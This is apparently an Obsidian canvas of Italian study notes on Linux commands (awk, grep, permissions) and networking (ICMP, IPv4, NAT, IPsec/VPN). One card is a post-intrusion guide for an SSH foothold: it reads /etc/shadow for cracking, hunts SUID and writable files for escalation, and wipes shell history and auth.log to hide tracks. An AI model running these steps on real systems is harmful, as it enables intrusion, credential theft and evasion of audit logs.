		{"id":"14bf4627959145d2","type":"text","text":"\n# **📊 `awk` - Il Coltellino Svizzero per Dati Testuali**\n\n`awk` è un linguaggio di scripting integrato nei sistemi Unix/Linux, usato per **analizzare, manipolare e trasformare** dati tabellari (testo strutturato in colonne).\n\n### **📌 Uso base**\n\n```bash\nawk '{print $1}' file.txt\n```\n\nStampa la **prima colonna** di ogni riga del file `file.txt`.\n\n### **📌 Opzioni avanzate**\n\n|Comando|Descrizione|\n|---|---|\n|`awk '{print $1, $3}' file.txt`|Stampa **prima e terza colonna**.|\n|`awk '/error/ {print $0}' log.txt`|Stampa le righe contenenti `\"error\"`.|\n|`awk -F: '{print $1}' /etc/passwd`|Usa `:` come separatore per estrarre i nomi utente.|\n|`awk '{sum += $2} END {print sum}' dati.txt`|Somma tutti i valori della **seconda colonna**.|\n|`awk 'NR==5' file.txt`|Stampa **solo la quinta riga**.|\n|`awk '{print NR, $0}' file.txt`|**Numera** ogni riga e la stampa.|\n\n### **🛠️ Trucchi da Hacker**\n\n1️⃣ **Trovare gli utenti con UID < 1000:**\n\n```bash\nawk -F: '$3 < 1000 {print $1, $3}' /etc/passwd\n```\n\n2️⃣ **Elencare i processi e la memoria che consumano:**\n\n```bash\nps aux | awk '{print $1, $2, $4 \"%\"}'\n```\n\n3️⃣ **Contare il numero di occorrenze di una parola in un file:**\n\n```bash\ngrep \"error\" log.txt | awk '{count++} END {print count}'\n```\n\n4️⃣ **Estrarre le richieste HTTP GET da un file di log:**\n\n```bash\nawk '$6 == \"\\\"GET\"' access.log\n```\n\n","x":7866,"y":-2800,"width":759,"height":1164},
		{"id":"5cff47e4f204089c","type":"text","text":"# Bash - Manipolare Cose: `awk`","x":6858,"y":-2696,"width":759,"height":957},
		{"id":"4b0914af8d708d70","type":"text","text":"# **🕵️‍♂️ **\n\nHai appena stabilito una connessione **SSH** con una macchina remota. Il tuo obiettivo ora è **capire dove ti trovi**, **chi sei**, **cosa puoi fare** e **fino a che punto puoi spingerti**. Un hacker esperto deve ottenere **il massimo delle informazioni nel minimo tempo possibile**, quindi seguiamo un approccio **metodico ed efficiente**. 🚀\n\n---\n\n## **📍 1. Dove Mi Trovo? Identificare il Sistema**\n\nLa prima domanda da porsi è: **che macchina è questa?** Potresti essere su un server Linux, un container Docker, una macchina virtuale... e ogni situazione cambia le tue possibilità d’azione.\n\n🔹 **Controllare il sistema operativo e la distribuzione**\n\n```bash\nuname -a   # Versione del kernel e architettura\ncat /etc/os-release  # Nome della distribuzione Linux\ncat /proc/version  # Info dettagliate sul kernel\n```\n\n💡 **Se vedi qualcosa tipo `container` o `lxc` nel kernel, probabilmente sei in un container Docker o LXC!**\n\n🔹 **Dove sei nel filesystem?**\n\n```bash\npwd   # Mostra la tua directory corrente\nls -la  # Lista tutto, inclusi file nascosti\nmount | column -t  # Controlla i filesystem montati\n```\n\n💡 **Se sei in `/home/user` o `/tmp`, probabilmente sei un utente normale. Se sei in `/root`... jackpot!**\n\n---\n\n## **🆔 2. Chi Sono? Controllare i Permessi dell’Utente**\n\n```bash\nwhoami   # Nome dell’utente attuale\nid       # UID, GID e gruppi dell’utente\ngroups   # Quali gruppi sono associati al tuo utente\n```\n\n💡 **Se il tuo UID è `0`, sei root!** Se no, controlla se sei in gruppi **privilegiati** (`sudo`, `docker`, `adm`... questi possono aiutarti a scalare privilegi).\n\n🔹 **Chi è loggato sulla macchina?**\n\n```bash\nwho      # Lista degli utenti connessi\nw        # Chi è connesso e cosa sta facendo\nlast     # Storico degli accessi\n```\n\n💡 **Se vedi admin o root attivi, potresti aspettare che eseguano un comando con `sudo` e provare un attacco di hijacking.**\n\n🔹 **Sto usando un account di servizio o un utente reale?**\n\n```bash\ncat /etc/passwd | grep $(whoami)\n```\n\nSe vedi qualcosa tipo `/bin/bash` o `/bin/sh` alla fine della riga, **sei un utente interattivo**. Se invece vedi `/usr/sbin/nologin` o `/bin/false`, è un account di servizio con accesso limitato.\n\n---\n\n## **🔎 3. Cosa Posso Fare? Capire i Privilegi**\n\n### **🔹 Ho accesso a `sudo`?**\n\n```bash\nsudo -l\n```\n\n💡 **Se puoi eseguire comandi senza password (`NOPASSWD`), potresti ottenere root facilmente!**\n\n### **🔹 Ci sono comandi con `SUID`?**\n\n```bash\nfind / -perm -4000 2>/dev/null\n```\n\n💡 **Se trovi `/bin/bash` con il bit SUID attivo, puoi eseguire una shell con privilegi elevati!**\n\n---\n\n## **📂 4. Esplorare il Filesystem e i Dati Sensibili**\n\n### **🔹 File Importanti da Controllare**\n\n```bash\ncat /etc/passwd  # Lista degli utenti\ncat /etc/shadow  # Hash delle password (richiede root, ma puoi provare...)\ncat /etc/sudoers  # Configurazione sudo\nls -la /root/  # Vedi cosa c'è nella home di root (se puoi)\n```\n\n💡 **Se hai accesso a `/etc/shadow`, puoi tentare di craccare le password con John the Ripper o Hashcat.**\n\n### **🔹 File con permessi deboli**\n\n```bash\nfind / -type f -perm -o+w 2>/dev/null  # File scrivibili da chiunque\nfind / -type d -perm -o+w 2>/dev/null  # Directory scrivibili da chiunque\n```\n\n💡 **Se un file di configurazione critico è scrivibile da te, potresti modificarlo per ottenere accesso elevato!**\n\n---\n\n## **📡 5. Controllare la Rete e il Contesto**\n\nSe sei entrato via **SSH**, probabilmente il sistema è **parte di una rete più grande**. Potresti cercare altre macchine vulnerabili da attaccare.\n\n🔹 **Quali interfacce di rete ci sono?**\n\n```bash\nip a\n```\n\n💡 **Se vedi un IP privato (`192.168.x.x`, `10.x.x.x`), potresti essere in una rete interna con altre macchine interessanti!**\n\n🔹 **Quali connessioni sono attive?**\n\n```bash\nnetstat -tulnp  # Mostra porte aperte e processi associati\nss -tulnp       # Alternativa più moderna a netstat\n```\n\n💡 **Se vedi servizi con porte aperte, potresti attaccarli per espandere il tuo accesso.**\n\n🔹 **Quali processi stanno girando?**\n\n```bash\nps aux --sort=-%mem  # Processi ordinati per uso memoria\nps aux --sort=-%cpu  # Processi ordinati per uso CPU\n```\n\n💡 **Se vedi un servizio con privilegi elevati, potresti provare un attacco tramite privilege escalation.**\n\n---\n\n## **🎭 6. Rimanere Invisibili**\n\nSe sei entrato in un sistema e vuoi **minimizzare le tracce**, ci sono alcune tecniche per coprire il tuo ingresso.\n\n🔹 **Pulire la cronologia della shell**\n\n```bash\nhistory -c && history -w\n```\n\n🔹 **Disabilitare la cronologia temporaneamente**\n\n```bash\nunset HISTFILE\nexport HISTSIZE=0\nexport HISTFILESIZE=0\n```\n\n🔹 **Eliminare i log SSH**\n\n```bash\n> ~/.bash_history\necho \"\" > /var/log/auth.log  # Richiede privilegi elevati\n```\n\n💡 **Tieni a mente:** Se sei in un ambiente monitorato, potrebbero comunque accorgersi di movimenti sospetti.\n\n---\n\n## **🚀 Conclusione: La Prima Mossa È Capire il Campo di Battaglia**\n\nOra sai **come raccogliere rapidamente informazioni su un sistema** una volta dentro via SSH.\n\n✅ **Dove sei?** Controlla il sistema operativo, il filesystem e la rete.  \n✅ **Chi sei?** Determina i tuoi privilegi e i gruppi a cui appartieni.  \n✅ **Cosa puoi fare?** Scansiona permessi, file sensibili, processi e accessi di rete.  \n✅ **Come coprirti?** Ripulisci tracce, disabilita log e cronologia.\n\n🔎 **Vuoi ora esplorare le tecniche di privilege escalation per ottenere root?** 😈","x":2820,"y":3894,"width":759,"height":4049},
		{"id":"acec287a5d504ba6","type":"text","text":"💡 **Trucco da hacker:** Puoi usare `pushd` e `popd` per **salvare e ripristinare rapidamente** la tua posizione.\n\n```bash\npushd /etc  # Salva la posizione corrente e vai in /etc\npopd        # Torna alla directory precedente\n```\n\n### **🔎 `which`, `whereis`, `type` - Trovare comandi**\n\n```bash\nwhich ls  # Percorso del comando 'ls'\nwhereis ls  # Mostra anche il manuale e i binari collegati\ntype ls  # Dice se è un comando built-in o esterno\n```\n\n💡 **Perché `cd` non ha un percorso?** Perché è un comando **interno** alla shell!\n\n---\n\n## **📜 5. Leggere File Importanti del Sistema**\n\n### **🛠 File fondamentali in `/etc`**\n\n- `/etc/passwd` → Utenti del sistema\n- `/etc/shadow` → Password criptate degli utenti\n- `/etc/hosts` → Mappatura IP ↔ Hostname\n- `/etc/fstab` → File system montati all'avvio\n\n```bash\ncat /etc/passwd  # Mostra utenti\ncat /etc/shadow  # Richiede permessi di root (password criptate)\ncat /etc/hosts  # Controlla domini personalizzati\n```\n\n---\n\n## **💣 6. Tecniche Avanzate e Trucchi da Hacker**\n\n🔹 **Montare filesystem manualmente**\n\n```bash\nmount /dev/sdb1 /mnt  # Monta una partizione\numount /mnt  # Smonta la partizione\n```\n\n💡 **Utile se trovi un disco USB e vuoi esplorarne il contenuto senza autorun.**\n\n🔹 **Controllare i processi e il filesystem in `/proc`**\n\n```bash\nls -l /proc/[PID]  # Esplora i dettagli di un processo specifico\ncat /proc/mounts  # Vedi i filesystem montati\n```\n\n💡 **Il `/proc` non è un filesystem reale, ma un’interfaccia per il kernel!**\n","x":1820,"y":3894,"width":759,"height":1182},
		{"id":"049e5ead3118c000","type":"text","text":"# Permessi Speciali & Access Control List (ACL)\n\nPotrei trovare cose diverse rispetto alla `x`, nei vari punti in cui dovrebbe comparire.\n\n- ***Set User ID*** (***SUID***) - Se trovo una `s` al posto della `x` sui permessi dell'`owner` significa che il `file` viene sempre eseguito con i privilegi dell'`owner`. Questo avviene ad esempio con `/usr/bin/passwd`, programma che serve a cambiare le password;\n\t- Aggiungo e rimuovo il `SUID` con `chmod u+s` e `chmod u-s`.\n- ***Set Group ID*** (***SGID***) - Se trovo una `s` al posto della `x` sui permessi del `group`, il `file` viene eseguito con i permessi del `gruppo`, e.g. tutti i file creati in una `directory` con `SGID` attivo erediteranno il gruppo della `directory` invece di quello del creatore;\n\t- Aggiungo e rimuovo il `SUID` con `chmod g+s dir` e `chmod g-s dir`;\n\t- Faccio questo esempio perché `SGID` tipicamente si usa sulle `directories`, mentre `SUID` si usa tipicamente sui `files` standard.\n- ***Sticky Bit*** - Se trovo una `t` al posto della `x` sui permessi degli `others` sto sicuramente guardando una `directory`, e l'effetto è il seguente: solo l'`owner` (e `root`, ovviamente) può cancellare/rinominare i file che compaiono nella `directory`.\n\t- Aggiungo e rimuovo `Sticky Bit` con `chmod +t dir` e `chmod -t dir`;\n\t- Utile per `directories` condivise, e.g. in `/tmp`.\n\nQuesti tre permessi speciali hanno a loro volta un trio di bit che definiscono se sono attivi o meno, nell'ordine `SUID SGID Sticky Bit`. `4xxx` indica un file con `SUID` attivo, `2xxx` analogo con `SGID` e `1xxx` analogo con `Sticky Bit`. Si sommano come i permessi standard (e.g. `6xxx` indica un oggetto con `SUID` e `SGID` entrambi attivi).\n\nInfine è possibile aggiungere permessi personalizzati per utenti e gruppi singoli tramite ***Access Control List*** (***ACL***). Controllo i permessi specifici con `getfacl file`, e li setto con\n\n```bash\nsetfacl [action] [target][permissions] [file]\n```\n\ndove `action` può essere un'aggiunta (`-m`) o una rimozione (`-x`), `target` può essere sia un `owner` (`u:username`) sia un gruppo (`g:groupname`) e i permessi sono i classici `rwx`.\n\nNota che questi permessi speciali non si vedono con `ls -l`, devo sempre usare `getfacl`.","x":1820,"y":-166,"width":759,"height":958,"color":"4"},
		{"id":"52300a2aca6a3d2b","type":"text","text":"# Significato dei Permessi\n\nÈ chiaro cosa significa leggere, scrivere ed eseguire un `file`. Ma con una `directory`?\n\n- Leggere una `directory` significa listare il suo contenuto con `ls`. Questo include l'uso di `tab` per l'autocompletamento di un percorso;\n- Scrivere una `directory` significa creare, rimuovere o eliminare `file` in essa contenuti;\n- Eseguire una `directory` significa entrarci con `cd`. Questo include ***attraversarla***, i.e. se non sono autorizzato `x` e voglio accedere ad una cartella interna per la quale ho invece tutti i permessi, non posso farlo!\n\t- Questo limita anche il comando `ls`, che potrà solo listare i `file` senza poter visualizzare i dettagli (che appariranno come tanti simpatici `?`);\n\t- Se ho il permesso `x` ma non `r` e voglio attraversare la `directory` per giungere in luoghi sui quali ho autorizzazioni, posso farlo solo se conosco l'esatto `path` di destinazione (non posso usare `tab`!).\n\nNota che i permessi sui `file` e sulle `directory` sono completamente indipendenti. Posso ad esempio modificare un `file` su cui ho il permesso `w` che si trova in una `directory` in cui non ce l'ho (perché non lo sto rimuovendo o rinominando).\n\nPer gli altri tipi di `inodes` il significato è simile a quello dei `files` standard (nei symlink i permessi sono sostanzialmente dei placeholder, dipende dal file puntato).\n\nIndipendentemente dai permessi, il `superuser` è sempre in grado di fare quello che vuole.\n\nIl senso di tutto questo si vede analizzando i `gruppi`: chi è nel gruppo `dialout`, ad esempio, ha di norma i permessi per accedere ai dispositivi seriali. In modo analogo, `video` è il gruppo con i permessi per la `GPU` e simili, `shadow` ha accesso alle password (crittate).","x":1820,"y":-1249,"width":759,"height":847,"color":"4"},
		{"id":"2e2f2fffcb29a514","type":"text","text":"# Bash - Trovare Cose nei `file`: `grep`\n\n`grep - Global Regular Expression Print` è un altro dei comandi più potenti di Linux. ***Trova cose dentro ai file***.\n\n```bash\ngrep [options] pattern [file(s)]\n```\n\n`pattern` è una ***stringa*** o una ***regex***.\n\n- `pattern = \"^error\"` restituirà solo le occorrenze di `error` ad inizio riga. Analogo `\"error$\"` a fine riga;\n- `.` rappresenta un qualsiasi carattere singolo, `*` significa `0 o più occorrenze`, `[]` delimitano una classe di caratteri (e.g. `[0-9]*` significa `qualsiasi numero di cifre`);\n- Le parentesi `()` si usano per definire i gruppi di caratteri (e.g. `(ab)*`);\n\nPosso specificare più `file(s)` con le `wildcards`, mentre le opzioni...\n\n- `Ax`, `-By` - Mostrano rispettivamente `x` righe dopo il match e `y` righe prima;\n- `-c` - Restituisce il numero di righe che contengono il `pattern`;\n- `-E` estende le regex, permettendo di usare gli operatori `+` (`1 o più occorrenze`), `?` (`nessuno o un carattere qualsiasi`) e `|` (`OR logico`);\n\t- Posso usare direttamente il comando `egrep`$\\iff$ `grep -E.\n- `-F` - Se invece voglio cercare una roba che sembra una regex ma non lo è (e.g. l'esatta occorrenza \"`.hello?`\", dove `.` è davvero un punto e `?` è davvero un punto interrogativo), devo disattivare l'interpretazione automatica delle regex, con `-F`;\n\t- Ottengo lo stesso risultato con il comando `fgrep`$\\iff$ `grep -F`.\n- `-o` - Mostra solo il match, non l'intera riga (utile se faccio una ricerca con una regex);\n- `-i` - Ignora la differenza tra maiuscole e minuscole;\n- `-r` - Ricerca ricorsivamente in tutte le sottodirectory, se `[file(s)]` è una `directory`;\n- `-v` - Inverte la ricerca, i.e. mostra solo le righe che ***non*** contengono `pattern`;\n- `-l` - Mostra solo i nomi dei file che contengono il pattern (e.g. utile con `-r`);\n\t- `-H` invece mostra ***anche*** il nome del file.\n- `-n` - Restituisce il numero di riga a cui è stato trovato il `pattern`;\n- `-w` - Trova solo le occorrenze esatte di `pattern` (e.g. mentre di norma se cerco `error` trovo anche cose tipo `error10`, con `-w` mi limito alle sole occorrenze di `error` isolato).\n","x":4838,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"4f8240ee05d14bd3","type":"text","text":"# Come comunicano i Router? (ICMP)\n\nCome faccio a sapere se un router è online? Se il `TTL` è scaduto? Come stimo *RTT*?\n\nPer tutte queste domande (e molto altro) esiste un simpatico e snello protocollo che viaggia direttamente come *payload* di IP. Serve tendenzialmente a comunicare tra il router e chi gli ha mandato il pacchetto.\n\nConsta di $4\\,byte$ più eventuali dati, così suddivisi:\n\n- ***Tipo*** - i primi $8\\,bit$ sono dedicati alla tipologia di messaggio, ad esempio\n\t- $0$ - Risposta *echo* (\"`ci sono!`\");\n\t- $3$ - Destinazione Irraggiungibile;\n\t- $8$ - Richiesta *echo* (\"`ci sei?`\");\n\t- $30$ - Dedicato a Traceroute;\n- ***Codice*** - i successivi $8\\,bit$ specificano l'informazione del Tipo. Per la maggior parte dei Tipi esiste solo il codice $0$, ma ad esempio per il Tipo $3$ abbiamo codici\n\t- $0$ - Rete non raggiungibile\n\t- $1$ - Host non raggiungibile\n\t- $3$ - Porta di destinazione non raggiungibile (\"su questa porta non c'è alcun servizio\");\n\t- $7$ - Host di destinazione sconosciuto;\n- Gli ultimi $16\\,bit$ sono un checksum.\n\n***Traceroute*** è un abuso di ICMP: si invia una sequenza di datagrammi UDP con un numero di porta tipicamente non usato per UDP. Prima mando `TTL = 1`, il primo router lo scarta e risponde ICMP, il che include l'IP del router che l'ha scartato. Poi `TTL = 2`, e così via. Quando arrivo a destinazione, il server non ha un servizio attivo su quella porta, quindi ricevo un \"porta irraggiungibile\" e so di aver finito. Così trovo la gente anche se non accetta i ping. I router possono anche decidere di non rispondere: non sto mandando ping, sono loro che decidono di rispondere al fatto che un pacchetto è stato scartato.\n\n\n\nEsiste, un po' diverso, anche a livello di IPv6. È utile perché non essendoci frammentazione mi interessa trovare l'MTU minimo del percorso, e lo faccio tramite un algoritmo che sfrutta ICMPv6 (***PathMTUDiscovery***).","x":-17388,"y":835,"width":780,"height":983,"color":"4"},
		{"id":"d76be3d4d10ad0c4","type":"text","text":"# Come fa un ISP ad ottenere un range di indirizzi IP?\n\nLa Grande Madre degli IP è l'***ICANN*** (**Internet Corporation for Assigned Names and Numbers**).\n\nQuesta gestisce l'intero spazio degli indirizzi IP a livello globale, assegnandoli in macro-blocchi a 5 ***Regional Internet Registers*** (**ARIN** Nord America, **RIPE NCC** Europa, Medio Oriente e parti dell'Asia Centrale, **APNIC** Asia-Pacifico, **LACNIC** America Latina e i Caraibi, **AFRINIC** Africa).\n\nGli ISP comprano i range di indirizzi dai RIR, dividendoli in blocchi e vendendoli alle organizzazioni.\n```\n11001000 00010111 0001yyyx xxxxxxxx <--> 200.23.16.0/20   # Comprato dall'ISP\n```\nIpotizziamo di volerli dividere in 8 blocchi, indicizzabili con 3 bit (`yyy`). Allora abbiamo\n```\n11001000 00010111 0001000x xxxxxxxx <--> 200.23.16.0/23   # Comprato da Organizzazione 1\n11001000 00010111 0001001x xxxxxxxx <--> 200.23.18.0/23   # Comprato da Organizzazione 2\n[...]\n11001000 00010111 0001111x xxxxxxxx <--> 200.23.30.0/23   # Comprato da Organizzazione 8\n```\nIn pratica, gli ISP pagano i RIR, i quali pagano l'ICANN, la quale investe in manutenzione della rete, sicurezza, ricerca e sviluppo (e.g. TLD del DNS). Gli ultimi indirizzi IPv4 sono stati assegnati ai RIR nel 2011. Ad oggi, IPv4 si tiene in piedi grazie al NAT, ed è in corso il passaggio a IPv6. ","x":-18554,"y":99,"width":916,"height":600,"color":"4"},
		{"id":"3ce011a34d648316","type":"text","text":"# Frammentazione IPv4\n\nI protocolli del livello di Collegamento prevedono una dimensione massima del frame, oltre la quale è necessario \"spezzarlo\" in due $\\Rightarrow$ ***Maximum Transmission Unit*** (e.g. $MTU_{\\text{Ethernet}} = 1500 byte$).\n\nSe ad IPv4 arriva un pacchetto troppo grande, deve spezzarlo. Se il datagramma iniziale era lungo `length = 4000` devo dividerlo in 3 datagrammi più piccoli, rispettivamente\n\n1. `length = 1500, fragflag = 1, offset = 0`;\n2. `length = 1500, fragflag = 1, offset = 185`;\n3. `length = 1500, fragflag = 0, offset = 370`.\n\nSi vede bene che la frammentazione è gestita da due campi dell'header:\n\n- `fragflag` - se  `= 1` significa \"ciao, sono solo un pezzo di un datagramma più grande, dopo di me ne arriverà un altro, se sei il destinatario ci devi riassemblare grazieprego\";\n- `offset` -  tiene traccia di dove sono arrivato rispetto al messaggio iniziale, e si conta in ottetti di byte. Il primo *payload* è di $1480\\,byte$, quindi il secondo partirà dall'ottetto $1480/8 = 185$. In pratica potevano sostituirli con dei numeri progressivi, ma le cose facili non ci piacciono.\n\nQuesti tre datagrammi sono indipendenti dal punto di vista della Rete, e possono potenzialmente prendere percorsi differenti a livello di routing. L'unico a cui interessano questi campi è il destinatario, al quale spetta il compito di usarli per riassemblare il datagramma originale.\n\nIPv6 vieta la frammentazione, esplora il livello di Collegamento per trovare $MTU_{\\text{min}}$ e capire quanto grande può mandare i pacchetti. Notare che, di nuovo, viola il principio di divisione dei layer.","x":-20560,"y":612,"width":814,"height":643,"color":"4"},
		{"id":"9ef9565d73660350","type":"text","text":"upper layer protocol specifica cosa c'è dentro il payload (TCP, UDP, OSPF 89, ...)","x":-20389,"y":1687,"width":472,"height":116},
		{"id":"72d78acc98f57a75","type":"text","text":"# Indirizzi IPv4\n\nIdentificativo a $32\\,bit$ ($2^{32}$ indirizzamenti) pensato originariamente per individuare univocamente ogni interfaccia di rete (e.g. cavo Ethernet) di ogni nodo. Adotta un notazione decimale puntata.\n\n```\ne.g. 11011111 00000001 00000001 00000001 = 223.1.1.1\n```\n\nIn pratica, l'IP non è né *hard-coded* né specifico del dispositivo di rete. Si tratta di un indirizzo\n- ***logico*** - individua la ***posizione*** dell'interfaccia all'interno della rete (non l'interfaccia in sé);\n- ***dinamico*** - proprio in virtù del suo individuare una posizione lo stesso dispositivo può avere IP diversi a seconda di dove si trova.\n\nQuesto suggerisce di costruire l'IP in modo ***gerarchico***. La struttura degli indirizzi IP viene oggi definita dal **Classless Inter Domain Routing** (***CIDR***, 1993), e si può dividere in due parti:\n\n- Una prima parte (***prefisso***) identifica la ***sottorete*** (***subnet***).\n\t- Se due host possono raggiungersi fisicamente senza attraversare un router (e quindi senza entrare propriamente in Internet) si definiscono essere all'interno di una *sottorete*;\n\t- In generale, sono *sottoreti* tutti i gruppi di host che risultano ancora interconnessi anche togliendo i router dalla rete;\n- Una seconda parte (***host***) che identifica l'interfaccia all'interno della sottorete.\n\nPer sapere quando è lungo il prefisso e quanto l'host si possono usare due notazioni:\n\n- `223.1.1.0/24` o `223.1.1/24`- indica che i primi 24 bit sono prefisso (subnet `11011111 00000001 00000001 = 223.1.1`), e i restanti 8 sono interfacce interne a quella sottorete (ce ne possono essere fino a 256, corrispondenti ai valori dell'ultimo ottetto da `0` a `255`);\n\t- Questa notazione è un po' più *human-friendly*;\n- `IP = 223.1.1.0` `subent_mask = 255.255.255.0` - indica la stessa identica cosa dell'esempio precedente, ma usando una ***maschera di sottorete*** (***subnet mask***). Molto utile a livello computazionale: `255.255.255.0 = 11111111 11111111 11111111 00000000`, notiamo che\n\t- `IP` $\\land$ `subnet_mask` = `prefisso`;\n\t\t- Il `prefisso` è anche il primo indirizzo della sottorete;\n\t\t- Se ho un `IP_destinazione` a cui voglio comunicare, mi basta fare l'$and$ con `subnet_mask` e confrontare con la mia sottorete (ottenuta in modo analogo con il `mio_IP`) per sapere se sto parlando in locale o devo passare per il ***gateway***;\n\t- $\\neg($`subnet_mask`$)+  1  =$ quanti indirizzi IP ci sono in questa sottorete;\n\t- `IP` $\\lor\\,(\\neg($`subnet_mask`$)) =$  ultimo indirizzo della sottorete ($\\Rightarrow$ broadcast sulla sottorete).\n\n","x":-19580,"y":99,"width":814,"height":1156,"color":"4"},
		{"id":"fc31d285a8ba2ad3","type":"text","text":"# Internet Protocol (IP)\n\nProtocollo standard *de facto* del livello di Rete. Definisce il formato del ***datagramma***, come frammentare/ricostruire i pacchetti che superano l'MTU Ethernet e la struttura degli ***indirizzi IP***.\n\n\n\n","x":-19400,"y":1364,"width":454,"height":181,"color":"4"},
		{"id":"a35f9569f0925a3a","type":"text","text":"# Data Plane\n\nA livello locale, il data plane si preoccupa di gestire il (***de)multiplexing logico e fisico dei singoli router*** ($\\Rightarrow$ associare a ogni informazione in ingresso l'uscita adeguata). Ciò avviene tramite una ***tabella di corrispondenze***, ed è detto ***forwarding***.\n\n","x":-19400,"y":1659,"width":454,"height":211,"color":"6"},
		{"id":"1f7d268a16eedc89","type":"file","file":"3 - Rete/IPv4.png","x":-20511,"y":1288,"width":716,"height":334},
		{"id":"ef01ecee9344c97a","type":"file","file":"3 - Rete/ICMP.png","x":-16188,"y":1168,"width":400,"height":317},
		{"id":"bbd22089bc42007f","type":"text","text":"# IP Sec e VPN\n\nLayer di sicurezza direttamente su IP. Può agire in due modi:\n\n- ***Authentication Header Protocol*** (***AH***) - Cifra il payload del datagramma. Questo porta problemi con i NAT, che controllano l'integrità del messaggio con una funzione di hash (la modifica del solo payload rompe il digest). Poco usato;\n- ***Encapsulation Security Protocol*** (***ESP***) - Detta ***modalità tunnel*** o più comunemente ***Virtual Private Network*** (***VPN***). Cifra l'intero datagramma e lo incapsula in un altro, sostituendo le vere informazioni end-to-end tra gli host con quelle end-to-end dei router della VPN. Solo a destinazione il datagramma originale viene riesumato, motivo per cui chi legge il traffico non vede l'IP dell'host che lo ha inviato, ma solo quello del router VPN.\n\nQuando si parla di IPsec ci si riferisce in pratica alla seconda modalità d'uso.\n\nSi può intuire che mentre IP è stateless ***IPsec crea una connessione***. Quando ciò avviene, il router di partenza $R_1$ invia al router di arrivo $R_2$ un set di ***Security Associations*** (***SAs***), che include chiavi si sessione e quant'altro. Una sorta di handshaking unidirezionale, i cui risultati vengono salvati in due distinti DB:\n\n- ***Security Policy Database*** (***SPD***) - Contiene le informazioni relative a quando e se usare IPsec, nonché quale SA usare. In pratica **sa cosa fare**;\n- ***Security Association Database*** (***SAD***) - Contiene le informazioni relative alle varie SAs, su come trattare i datagrammi in uscita e quelli in ingresso. In pratica **sa come farlo**.\n\nA questo punto aggiunge del padding in coda al datagramma originale (per evitare attacchi di tipo ***deep packet inspection***, in cui deduco informazioni sul messaggio dalla sua lunghezza) e cifra il tutto con la chiave simmetrica.\n\nAggiunge quindi header ESP che specifica l'ID del tunnel e il numero di sequenza del pacchetto. Questo, insieme al MAC aggiunto in coda, evita gli attacchi replay: ricevere un duplicato farà cadere la connessione.\n\nInfine, aggiunge il nuovo header IP e invia il datagramma.\n\nQualunque agente esterno tra $R_1$ ed $R_2$ non può fare assolutamente niente rispetto al messaggio originale (se non eventualmente far cadere la connessione).","x":-16378,"y":-292,"width":780,"height":991,"color":"#4545ff"},
		{"id":"9b371b4161e579d9","type":"text","text":"# Quanto è affidabile una VPN?\n\nPer quanto sembri impeccabile, c'è un unico punto di failure: chi controlla la VPN ha tutti i dati. Mi devo fidare della VPN, perché sa tutto quello che mando.\n\nNon che rivendano i dati, ma possono bussare alla porta quelli dell'FBI. E se succede non possono neanche dirlo al pubblico, ma c'è uno stratagemma: usare una cosiddetta \"dichiarazione canarino\", ovvero un sito la cui sola presenza online è un messaggio del tipo \"se questa pagina esiste ancora allora i servizi segreti non sono ancora entrati\".\n\nOgni azienda che offre una VPN deve rispondere alle leggi del proprio paese. In genere conviene usare una VPN svizzera (o meglio ancora Panama).\n\n- USA, UK, Canada, Australia e Nuova Zelanda formano ***I Cinque Occhi***, un'alleanza internazionale per la condivisione di informazioni di intelligence, in particolare circa la sorveglianza elettronica. Possono essere fatte richieste invasive ai provider di VPN;\n- Se aggiungiamo Danimarca, Francia, Paesi Bassi e Norvegia otteniamo ***I Nove Occhi***;\n- Se aggiungiamo anche Germania, Belgio, ***Italia***, Spagna e Svezia arriviamo a ***Quattordici Occhi***, ma come ogni fazione che riguarda l'Italia sembra essere un po' più easy delle altre.","x":-15447,"y":179,"width":757,"height":520,"color":"#4545ff"},
		{"id":"9290043c9f3df071","type":"file","file":"VPN.png","x":-15338,"y":-161,"width":539,"height":197},
		{"id":"7a683155fe19cadc","type":"text","text":"# Quindi cosa devo usare?\n\nDipende da cosa devi fare. Se devi creare una singola connessione che parte dall'interno della LAN non ci sono problemi.\n\n|                                                                                                                     | NAT Statico | NAT Dinamico | PAT Statico                  | PAT Dinamico                 |\n| ------------------------------------------------------------------------------------------------------------------- | ----------- | ------------ | ---------------------------- | ---------------------------- |\n| Assegna l'IP in modo deterministico?                                                                                | Sì          | No           | Sì                           | Dipende dalla configurazione |\n| Posso avviare la comunicazione dall'esterno (i.e. ha senso metterci dietro un server)?                              | Sì          | No           | Sì                           | No                           |\n| Una volta che fuori conoscono il mio IP, posso creare facilmente una connessione a doppio canale (e.g. Active FTP)? | Sì          | Sì           | Va scritto in modo esplicito | No                           |\n| Protegge bene da un *NAT Traversal*?                                                                                | No          | Circa        | No                           | Sì                           |\n\nTutte queste decisioni vengono prese guardando soltanto l'`IP_Sorgente`. Posso prendere decisioni anche a seconda dell'`IP_Destinazione` (***Policy NAT***).\n```\nif source 192.168.1/24 and destination 100.1.1.1\n\t192.168.1/24 > 200.1.1.1\n\nif source 192.168.1/24\n\t192.168.1/24 > 200.1.1.5\n```\nInoltre posso tradurre anche la destinazione (***Twice NAT***). Se ad esempio cerco un server DNS, il router aziendale può reindirizzarmi da `8.8.8.8` (check sulla destinazione, quindi usando *Policy NAT*) al proprio server DNS (e.g. `static NAT destination to 80.80.80.80`).","x":-16378,"y":-1181,"width":780,"height":815,"color":"4"},
		{"id":"8d45a43704e34f6f","type":"text","text":"# Tipi di NAT e Port Address Translation (PAT)\n\nIn realtà questa descrizione di NAT è un po' superficiale e serve solo a capire il meccanismo generale. Il NAT è la traduzione degli indirizzi IP privati in pubblici, non delle porte.\n\n- Un ***NAT Statico*** mappa *one-to-one* gli `IP_Host` agli `IP_NAT` disponibili tramite delle direttive *hard-coded* dall'admin di rete (e.g. `192.168.1.165` -> `200.1.1.1`). In questo caso, ogni assegnazione viene dichiarata esplicitamente;\n- Un ***NAT Dinamico*** fa la stessa cosa, ma in modo più flessibile. Una direttiva può essere `192.168.1.0\\24 will share 200.1.1.1 through 200.1.1.5`, ovvero \"quando un host `192.168.1.xxx` manda una richiesta per Internet, assegnagli un indirizzo casuale tra quelli disponibili nel range \\[`200.1.1.1`, `200.1.1.5`\\]\".\n\nIn entrambi i casi, il numero di `Host` che si possono collegare dietro NAT è limitato dal numero di indirizzi `IP_NAT` disponibili, perché il **NAT opera solo a livello di Rete**. Mappare diversi `IP_Host` in uno stesso `IP_NAT` pubblico (***IP*** (o ***NAT***) ***Overloading***) è possibile solo se si usano le porte per demultiplexare. Questo significa usare anche un ***Port Address Translation*** (***PAT***). Usare 